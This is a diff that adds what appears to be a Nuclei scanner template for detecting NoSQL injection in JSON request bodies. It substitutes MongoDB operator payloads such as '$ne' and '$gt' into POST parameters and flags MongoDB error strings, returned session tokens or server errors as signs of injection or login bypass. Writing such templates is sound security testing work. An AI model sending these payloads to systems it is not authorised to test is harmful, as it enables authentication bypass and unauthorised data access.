@@ -1,0 +1,67 @@
+id: nosql-injection-json-body
+
+info:
+  name: NoSQL Injection via JSON Body Parameter Replacement
+  author: bugscanner
+  severity: high
+  description: |
+    Replaces JSON body parameter values with MongoDB NoSQL operator objects
+    ($ne, $gt). Targets POST endpoints accepting JSON (login, search, filter
+    APIs). A successful auth bypass returns a 200 with a session token where
+    a 401/403 was expected. Error strings indicate the app is processing
+    the injected operators.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
+  tags: custom,nosql,injection,mongodb,fuzz
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "POST" && contains(to_lower(content_type), "json")'
+
+    fuzzing:
+      # Replace all JSON string values with NoSQL operator objects
+      - part: body
+        type: replace
+        mode: multiple
+        fuzz:
+          - '{"$ne":null}'
+          - '{"$gt":""}'
+
+    matchers-condition: or
+    matchers:
+      # Error-based: MongoDB is processing the injected operators and erroring
+      - type: word
+        part: body
+        words:
+          - "MongoError"
+          - "MongoServerError"
+          - "Cast to string failed"
+          - "unknown top level operator"
+          - "unknown operator"
+          - "$ne is not allowed"
+          - "query selector"
+          - "invalid operator"
+          - "BSON"
+          - "CastError"
+        condition: or
+        case-insensitive: true
+        name: nosql-error-response
+
+      # Auth bypass: a token or authenticated response on what should be a login endpoint
+      - type: word
+        part: body
+        words:
+          - '"access_token"'
+          - '"auth_token"'
+          - '"jwt"'
+          - '"session"'
+        condition: or
+        name: possible-auth-bypass
+
+      - type: status
+        status:
+          - 500
+        name: server-error-on-injection
